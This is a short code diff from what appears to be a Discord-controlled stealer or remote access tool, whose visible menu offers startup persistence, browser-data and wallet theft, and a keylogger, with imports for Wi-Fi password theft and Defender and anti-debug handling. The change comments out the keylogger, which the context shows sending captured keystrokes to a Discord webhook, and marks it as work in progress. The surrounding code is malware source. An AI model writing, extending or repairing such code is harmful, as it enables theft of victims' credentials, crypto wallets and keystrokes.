@@ -5,7 +5,7 @@ from tkinter import messagebox
 import sys
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
 from modules.browser import run, delete_files
-from modules.keylogger import Keylogger
+#from modules.keylogger import Keylogger
 #from modules.antidebug import Antidebug
 from modules.info import start
 from modules.wifi import WifiPasswords
@@ -93,7 +93,7 @@ commands = "\n".join([
     "startup - Add to startup",
     "browser - Get browser data",
     "wallet - Get wallet information",
-    "keylogger - Enable keylogger",
+    "keylogger - Enable keylogger -- WIP",
     "!quit - Exit session without deleting all the data",
     "!exit - Exit session and delete all data"
 ])
@@ -509,7 +509,7 @@ async def on_message(message):
         try:
             webhook = await message.channel.create_webhook(name="Keylogger")
             await message.reply(f"Created webhook, using URL: {webhook.url}")
-            Keylogger(webhook.url).run()
+            #Keylogger(webhook.url).run()
         except:
             await message.reply(f"Failed to create new webhook!")
             return
